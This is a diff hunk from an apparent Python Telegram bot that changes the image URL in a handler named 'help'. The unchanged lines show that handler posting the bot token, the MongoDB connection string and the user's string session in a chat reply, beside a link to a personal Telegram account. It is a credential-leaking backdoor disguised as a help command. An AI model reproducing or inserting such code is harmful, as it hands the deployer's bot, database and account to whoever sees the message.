@@ -107,7 +107,7 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://files.catbox.moe/yvwrge.jpg",
+          photo=f"https://graph.org/file/a815501ba59938d65a1e1-90eb887db74d072681.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Shivang_mishra_op)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
